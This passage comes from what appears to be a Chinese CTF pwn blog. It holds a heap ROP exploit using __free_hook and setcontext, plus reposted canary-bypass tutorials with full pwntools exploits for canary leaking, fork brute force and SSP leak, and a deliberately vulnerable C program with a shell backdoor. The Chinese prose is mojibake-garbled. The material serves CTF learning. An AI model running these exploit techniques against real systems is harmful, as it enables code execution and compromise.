class="hljs-number">0x3EBCA0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x00000000000215bf</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x0000000000023eea</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b96</span> + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>read = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br><span class="hljs-comment">#open = libc_base + libc.sym[&quot;open&quot;]</span><br>rop_addr = heap_addr+<span class="hljs-number">0x1000</span><br>flag_addr = heap_addr+<span class="hljs-number">0x2000</span><br><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br>log.info(<span class="hljs-string">&quot;orw rop len is: &quot;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(rop)))<br>add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span><br>edit(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>	add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x18</span>)<br>edit(p64(heap_addr + <span class="hljs-number">0x50</span>))<br>add(<span class="hljs-number">0x38</span>)<br>payload = p64(free_hook) + p64(flag_addr) + p64(heap_addr + <span class="hljs-number">0x2000</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x20A0</span>) + p64(rop_addr) + p64(rop_addr+<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(setcontext))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br>add(<span class="hljs-number">0x40</span>)<br>edit(p64(rop_addr) + p64(ret))<br>add(<span class="hljs-number">0x50</span>)<br>edit(rop[:<span class="hljs-number">0x50</span>])<br>add(<span class="hljs-number">0x60</span>)<br>edit(rop[<span class="hljs-number">0x50</span>:])<br>add(<span class="hljs-number">0x30</span>)<br>free()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ç”±äºå…¶ä»–çš„é¢˜ç›®æˆ‘è¿˜æœªå½»åº•å­¦ä¼šï¼Œæ‰€ä»¥è¿™é‡Œè´´ä¸Šå¤§ä½¬çš„åšå®¢ï¼Œé‡Œé¢æœ‰å…¶ä»–é¢˜ç›®çš„wpï¼š</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p>
<p><a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">https://nuoye-blog.github.io/2021/05/16/466a7375/</a></p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>canaryåˆé›†â€”â€”è½¬è½½</title>
    <url>/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h1 id="è½¬è½½è‡ªNç¥åšå®¢"><a href="#è½¬è½½è‡ªNç¥åšå®¢" class="headerlink" title="è½¬è½½è‡ªNç¥åšå®¢"></a>è½¬è½½è‡ª<a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more">Nç¥åšå®¢</a></h1><h1 id="Canaryä»‹ç»"><a href="#Canaryä»‹ç»" class="headerlink" title="Canaryä»‹ç»"></a>Canaryä»‹ç»</h1><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">Canaryä¸­æ–‡æ„è¯‘ä¸ºé‡‘ä¸é›€ï¼Œæ¥æºäºè‹±å›½çŸ¿äº•å·¥äººç”¨æ¥æ¢æŸ¥äº•ä¸‹æ°”ä½“æ˜¯å¦æœ‰æ¯’çš„é‡‘ä¸é›€ç¬¼å­ã€‚å·¥äººä»¬æ¯æ¬¡ä¸‹äº•éƒ½ä¼šå¸¦ä¸Šä¸€åªé‡‘ä¸é›€ã€‚å¦‚æœäº•ä¸‹çš„æ°”ä½“æœ‰æ¯’ï¼Œé‡‘ä¸é›€ç”±äºå¯¹æ¯’æ€§æ•æ„Ÿå°±ä¼šåœæ­¢é¸£å«ç”šè‡³æ­»äº¡ï¼Œä»è€Œä½¿å·¥äººä»¬å¾—åˆ°é¢„è­¦<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•æŠŠå®ƒç†è§£æˆä¸€ä¸ªç±»ä¼¼äºcookieä¹‹ç±»çš„ä¸œè¥¿ï¼Œç¨‹åºæ‰§è¡Œæ—¶éœ€è¦éªŒè¯å®ƒæ˜¯æ­£ç¡®çš„æ‰èƒ½æ­£å¸¸å‘ä¸‹æ‰§è¡Œ<br>é€šå¸¸çš„æ ˆæº¢å‡ºåˆ©ç”¨ï¼Œéœ€è¦è¦†ç›–è¿”å›åœ°å€ä»¥æ§åˆ¶ç¨‹åºæµï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨è¦†ç›–è¿”å›åœ°å€ä¹‹å‰æ’å…¥ä¸€ä¸ªå«Canaryçš„cookieä¿¡æ¯ï¼Œå½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹Canaryçš„å€¼æ˜¯å¦è¢«æ›´æ”¹ï¼Œå°±å¯ä»¥åˆ¤æ–­æ˜¯å¦å‘ç”Ÿäº†æ ˆæº¢å‡ºè¿™ç§å±é™©è¡Œä¸ºï¼Œå¦‚æœCanaryè¢«æ›´æ”¹ï¼Œç¨‹åºä¼šå»æ‰§è¡Œ__stack_chk_failå‡½æ•°å¹¶ç»“æŸã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œcanaryå¤§éƒ¨åˆ†æƒ…å†µéƒ½æ˜¯åœ¨rbp-0x8çš„ä½ç½®<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/1.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/1-1622104561265.png" alt="img"></a><br>æ ˆä¸­çš„canaryå¤§æ¦‚é•¿è¿™æ ·<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/2.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/2.png" alt="img"></a></p>
<h2 id="è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary"><a href="#è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary" class="headerlink" title="è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary"></a>è¦†ç›–ä½å­—èŠ‚æ³„éœ²Canary</h2><p>æœ‰äº›å­˜åœ¨æº¢å‡ºæ¼æ´çš„ç¨‹åºï¼Œåœ¨è¦æ±‚æˆ‘ä»¬è¾“å…¥å­—ç¬¦åï¼Œä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ‰“å°å‡ºæ¥ï¼Œè€Œcanaryçš„æœ€ä½ä½æ˜¯\x00ï¼Œæ˜¯ä¸ºäº†è®©canaryå¯ä»¥æˆªæ–­è¾“å…¥çš„å­—ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æº¢å‡ºï¼Œå¤šè¦†ç›–ä¸€ä¸ªå­—èŠ‚ï¼Œå°†\x00ç»™è¦†ç›–æ‰ï¼Œé‚£ä¹ˆcanaryå°±ä¼šå’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¿èµ·æ¥ï¼Œé‚£ä¹ˆï¼Œç¨‹åºæ‰“å°æ—¶æ²¡æœ‰æ£€æŸ¥æ‰“å°å­—ç¬¦çš„é•¿åº¦çš„è¯ï¼Œå°±å¯ä»¥è¿å¸¦ç€Canaryæ‰“å°å‡ºæ¥äº†ï¼Œç„¶åå†æ¬¡æº¢å‡ºï¼Œå°†æ³„éœ²å‡ºçš„canaryå¡«å…¥åŸæ¥çš„ä½ç½®ï¼Œå°±å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€äº†</p>
<h3 id="ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ-å¦é—¨é‚€è¯·èµ›pwn1"><a href="#ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ-å¦é—¨é‚€è¯·èµ›pwn1" class="headerlink" title="ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ_å¦é—¨é‚€è¯·èµ›pwn1"></a>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œ_å¦é—¨é‚€è¯·èµ›pwn1</h3><p>åˆ†æä¸‹ä»£ç <br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/3.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/3.png" alt="img"></a><br>å­˜åœ¨æ ˆæº¢å‡ºï¼Œcanaryåœ¨rbp-0x8çš„ä½ç½®ï¼Œå¯ä»¥å°†è¾“å…¥çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥<br>é‚£æ€è·¯å°±å¾ˆæ˜ç¡®äº†<br>å…ˆé€šè¿‡å¤šå†™1å­—èŠ‚å°†\x00è¦†ç›–ï¼Œç„¶åæ‰“å°æ³„éœ²Canaryï¼Œæœ€åç›´æ¥ROP<br>è¦†ç›–å®Œå¤§æ¦‚é•¿è¿™æ ·<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/4.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/4.png" alt="img"></a></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span><br><span class="hljs-attribute">binary</span> = &#x27;./babystack&#x27;<br><span class="hljs-attribute">local</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> local == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">p</span>=process(binary)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">p</span>=remote(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-attribute">elf</span>=ELF(binary)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;/lib/x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>-linux-gnu/libc.so.<span class="hljs-number">6</span>&#x27;)<br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400</span>a<span class="hljs-number">93</span><br><span class="hljs-attribute">puts_got</span> = elf.got[&#x27;puts&#x27;]<br><span class="hljs-attribute">puts_plt</span> = elf.plt[&#x27;puts&#x27;]<br><span class="hljs-attribute">start</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400720</span><br><span class="hljs-attribute">def</span> exp():<br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span><br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + &#x27;\n&#x27;)<br>    <span class="hljs-attribute">canary</span> = u<span class="hljs-number">64</span>(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;canary==&gt;&quot;</span> + hex(canary))<br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(puts_got) + p<span class="hljs-number">64</span>(puts_plt) + p<span class="hljs-number">64</span>(start)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(p.recvuntil(&#x27;\x<span class="hljs-number">7</span>f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,&#x27;\x<span class="hljs-number">00</span>&#x27;))<br>    <span class="hljs-attribute">libc_base</span> = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + hex(puts_addr))<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + hex(libc_base))<br>    <span class="hljs-attribute">one_gadget</span> = libc_base + <span class="hljs-number">0</span>xf<span class="hljs-number">1207</span><br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span>(one_gadget)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.send(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">p</span>.interactive()<br><span class="hljs-attribute">exp</span>()<br></code></pre></td></tr></table></figure>

<h2 id="Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary"><a href="#Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary" class="headerlink" title="Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary"></a>Forkå­è¿›ç¨‹ç¨‹åºçˆ†ç ´canary</h2><p>Forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹ç›¸å½“äºå¤åˆ¶ä¸€ä»½å½“å‰è¿›ç¨‹ï¼Œå¹¶ä¸”å…¶ä¸­çš„å†…å­˜å¸ƒå±€ä»¥åŠå˜é‡ç­‰ï¼ŒåŒ…æ‹¬canaryéƒ½ä¸çˆ¶è¿›ç¨‹ä¸€è‡´<br>é‚£ä¹ˆæ¯æ¬¡ç¨‹åºæŒ‚äº†ï¼Œéƒ½ç›¸å½“äºä¼šå†é‡æ–°å¼€å§‹ä¸€é<br>é‚£æˆ‘ä»¬å¯ä»¥é€ä½çˆ†ç ´canaryï¼Œå¦‚æœç¨‹åºæŒ‚äº†å°±è¯´æ˜è¿™ä¸€ä½ä¸å¯¹ï¼Œå¦‚æœç¨‹åºæ­£å¸¸å°±å¯ä»¥æ¥ç€è·‘ä¸‹ä¸€ä½ï¼Œç›´åˆ°çˆ†ç ´å‡ºæ­£ç¡®çš„canary</p>
<h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>è¿™åŸºæœ¬ä¸Šéƒ½æ˜¯ç›´æ¥ä»veritasğŸ‘´ğŸ‘´çš„blogé‡Œæ‘˜å‡ºæ¥çš„</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vul</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">read</span>(STDIN_FILENO, buffer, <span class="hljs-number">120</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>	<span class="hljs-keyword">pid_t</span> pid;<br>	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>		pid = fork();<br>		<span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>			<span class="hljs-built_in">vul</span>();<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-comment">//gcc main.c -m32 -o bin</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åå°±ç¡¬çˆ†ç ´</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br>p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x100</span>):<br>        p.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + chr(i))<br>        <span class="hljs-keyword">a</span> = p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;recv&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span>:<br>            canary += chr(i)<br>            break<br><br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">12</span> + p32(<span class="hljs-number">0x80485FB</span>))<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>flag = p.recv()<br>p.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;key is:&#x27;</span> + flag)<br><span class="hljs-comment">#  [*] Stopped process &#x27;./bin&#x27; (pid 17747)</span><br><span class="hljs-comment">#  [+] key is:flag&#123;test&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="SSP-Stack-Smashing-Protect-Leak"><a href="#SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="SSP(Stack Smashing Protect) Leak"></a>SSP(Stack Smashing Protect) Leak</h2><p>è¿™ä¸ªæ–¹æ³•ä¸èƒ½getshellï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è§¦å‘canaryæ—¶çš„æŠ¥é”™ä¿¡æ¯ï¼Œæ¥æ‰“å°å‡ºæˆ‘ä»¬æƒ³è¦çš„å†…å­˜ä¸­çš„å€¼ï¼Œä¾‹å¦‚flag<br>è§¦å‘canaryæ—¶ä¼šå»æ‰§è¡Œ_stack_chk_failå‡½æ•°ï¼Œæ‰§è¡Œè¿™ä¸ªå‡½æ•°æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ‰“å°è¿™ä¹ˆä¸€æ®µä¿¡æ¯<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/7.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/7.png" alt="img"></a><br>æˆ‘ä»¬åˆ†æä¸‹__stack_chk_failçš„æºç <br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/5.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/5.png" alt="img"></a><br>ä»–ä¼šè°ƒç”¨ä¸€ä¸ª__fortify_failå‡½æ•°å¹¶ä¼ å…¥â€stack smashing detectedâ€å­—ç¬¦ä¸²<br>æˆ‘ä»¬æ¥ç€åˆ†æ__fortify_failå‡½æ•°<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/6.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/6.png" alt="img"></a><br>æ­¤å¤„ï¼Œç¬¬ä¸€ä¸ª%sçš„å‚æ•°æ˜¯msgï¼Œç¬¬äºŒä¸ªå‚æ•°éœ€è¦åˆ¤æ–­ï¼Œå¦‚æœmsg!=NULLï¼Œå°±æ‰“å°__libc_argv[0]ï¼Œå¦åˆ™æ‰“å°â€<unknown>â€ï¼Œè€Œargv[0]å­˜å‚¨çš„å°±æ˜¯ç¨‹åºåï¼Œä¸”è¿™ä¸ªå‚æ•°å­˜äºæ ˆä¸Šï¼Œæˆ‘ä»¬åªè¦ä¿®æ”¹æ ˆä¸Šçš„argv[0]æŒ‡é’ˆä¸ºflagçš„åœ°å€ï¼Œå°±å¯ä»¥æ‰“å°å‡ºflag</unknown></p>
<h3 id="ä¾‹é¢˜ï¼šwdb2018-guess"><a href="#ä¾‹é¢˜ï¼šwdb2018-guess" class="headerlink" title="ä¾‹é¢˜ï¼šwdb2018_guess"></a>ä¾‹é¢˜ï¼šwdb2018_guess</h3><p>åˆ†æmainå‡½æ•°</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall main(__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3)<br>&#123;<br>  __WAIT_STATUS stat_loc; <span class="hljs-comment">// [rsp+14h] [rbp-8Ch]</span><br>  <span class="hljs-built_in">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-84h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+20h] [rbp-80h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-78h]</span><br>  <span class="hljs-built_in">char</span> buf<span class="hljs-literal">[<span class="hljs-number">48</span>]</span>; <span class="hljs-comment">// [rsp+30h] [rbp-70h]</span><br>  <span class="hljs-built_in">char</span> s2<span class="hljs-literal">[<span class="hljs-number">56</span>]</span>; <span class="hljs-comment">// [rsp+60h] [rbp-40h]</span><br>  unsigned __int64 v10; <span class="hljs-comment">// [rsp+98h] [rbp-8h]</span><br><br>  v10 = <span class="hljs-constructor">__readfsqword(0x28u)</span>;<br>  v7 = <span class="hljs-number">3L</span>L;<br>  <span class="hljs-constructor">LODWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__uptr</span>)</span> = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0L</span>L;<br>  sub<span class="hljs-constructor">_4009A6()</span>;<br>  <span class="hljs-constructor">HIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-number">0</span>, a2);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span><span class="hljs-operator"> == </span>-<span class="hljs-number">1</span> )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;./flag.txt&quot;</span>);<br>    <span class="hljs-constructor">_exit(-1)</span>;<br>  &#125;<br>  read(<span class="hljs-constructor">SHIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  close(<span class="hljs-constructor">SHIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span>);<br>  puts(<span class="hljs-string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v6 &gt;= v7 )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;you have no sense... bye :-) &quot;</span>);<br>      return <span class="hljs-number">0L</span>L;<br>    &#125;<br>    v5 = sub<span class="hljs-constructor">_400A11()</span>;<br>    <span class="hljs-keyword">if</span> ( !v5 )<br>      break;<br>    ++v6;<br>    wait((__WAIT_STATUS)&amp;stat_loc);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Please type your guessing flag&quot;</span>);<br>  gets(s2);<br>  <span class="hljs-keyword">if</span> ( !strcmp(buf, s2) )<br>    puts(<span class="hljs-string">&quot;You must have great six sense!!!! :-o &quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    puts(<span class="hljs-string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);<br>  return <span class="hljs-number">0L</span>L;<br>&#125;<br></code></pre></td></tr></table></figure>

